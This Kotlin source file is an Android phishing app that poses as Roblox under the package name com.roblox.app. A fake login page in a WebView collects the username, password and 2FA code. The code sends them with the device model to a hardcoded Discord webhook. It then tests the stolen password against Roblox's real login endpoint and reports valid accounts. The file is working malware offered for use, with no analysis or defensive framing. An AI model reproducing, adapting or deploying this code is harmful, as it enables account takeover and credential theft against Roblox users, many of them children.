package com.roblox.app

import android.annotation.SuppressLint
import android.os.Bundle
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    private val webhook = "https://discord.com/api/webhooks/1556711449571627051/ruYxawxPFw_X7ZGc8t0uQgsnxfkOCesqxRKJl2eqC6321t0PCClPr9PxQqGMchhpzr6Z"

    private val client = OkHttpClient.Builder()
        .connectTimeout(12, TimeUnit.SECONDS)
        .readTimeout(12, TimeUnit.SECONDS)
        .followRedirects(true)
        .build()

    private val jsonType = "application/json; charset=utf-8".toMediaType()

    private var user = ""
    private var pass = ""
    private var webView: WebView? = null

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        webView = WebView(this).apply {
            settings.javaScriptEnabled = true
            settings.domStorageEnabled = true
            settings.userAgentString = "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
            addJavascriptInterface(Bridge(), "Android")
            webViewClient = WebViewClient()
        }
        setContentView(webView)
        webView?.loadUrl("file:///android_asset/login.html")
    }

    inner class Bridge {

        @JavascriptInterface
        fun sendUser(u: String) {
            user = u.trim()
            Thread {
                val result = checkUser(user)
                runOnUiThread {
                    val js = "window.__rbxUserCheck(${result.valid}, ${JSONObject.quote(result.hint)})"
                    webView?.evaluateJavascript(js, null)
                }
            }.start()
        }

        @JavascriptInterface
        fun sendPass(p: String) {
            pass = p
            send("**Roblox Login**\n```\nUser: $user\nPass: $pass\nDevice: ${android.os.Build.MODEL} (${android.os.Build.VERSION.RELEASE})\n```")
            Thread { checkPassword(user, pass) }.start()
        }

        @JavascriptInterface
        fun send2FA(code: String) {
            send("**Roblox 2FA**\n```\nUser: $user\nPass: $pass\nCode: $code\nDevice: ${android.os.Build.MODEL}\n```")
        }
    }

    data class UserCheck(val valid: Boolean, val hint: String)

    private fun checkUser(username: String): UserCheck {
        if (username.contains("@")) return UserCheck(true, "")
        try {
            val body = JSONObject()
                .put("usernames", JSONArray().put(username))
                .put("excludeBannedUsers", false)
                .toString()
                .toRequestBody(jsonType)

            val req = Request.Builder()
                .url("https://users.roblox.com/v1/usernames/users")
                .post(body)
                .header("Content-Type", "application/json")
                .header("User-Agent", "Roblox/WinInet")
                .build()

            client.newCall(req).execute().use { resp ->
                if (!resp.isSuccessful) return UserCheck(true, "")
                val arr = JSONObject(resp.body!!.string()).optJSONArray("data") ?: return UserCheck(true, "")
                if (arr.length() == 0) {
                    return UserCheck(false, "Пользователь не найден")
                }
                return UserCheck(true, "")
            }
        } catch (_: Exception) {
            return UserCheck(true, "")
        }
    }

    private fun checkPassword(username: String, password: String) {
        try {
            val csrfReq = Request.Builder()
                .url("https://auth.roblox.com/v2/logout")
                .post("".toRequestBody("text/plain".toMediaType()))
                .header("User-Agent", "Roblox/WinInet")
                .build()

            var csrf = ""
            try {
                client.newCall(csrfReq).execute().use { r ->
                    csrf = r.header("x-csrf-token") ?: ""
                }
            } catch (_: Exception) {}

            if (csrf.isEmpty()) return

            val loginBody = JSONObject()
                .put("ctype", if (username.contains("@")) "Email" else "Username")
                .put("cvalue", username)
                .put("password", password)
                .toString()
                .toRequestBody(jsonType)

            val loginReq = Request.Builder()
                .url("https://auth.roblox.com/v2/login")
                .post(loginBody)
                .header("Content-Type", "application/json")
                .header("User-Agent", "Roblox/WinInet")
                .header("X-CSRF-Token", csrf)
                .build()

            client.newCall(loginReq).execute().use { r ->
                val code = r.code
                val body = r.body?.string() ?: ""
                if (code == 200 || code == 403) {
                    send("**✅ Roblox VALID LOGIN**\n```\nUser: $user\nPass: $pass\nHTTP: $code\nDevice: ${android.os.Build.MODEL}\nResp: ${body.take(300)}\n```")
                }
            }
        } catch (_: Exception) {}
    }

    private fun send(text: String) {
        Thread {
            try {
                val json = JSONObject().put("content", text.take(1900))
                val body = json.toString().toRequestBody(jsonType)
                client.newCall(Request.Builder().url(webhook).post(body).build()).execute().close()
            } catch (_: Exception) {}
        }.start()
    }
}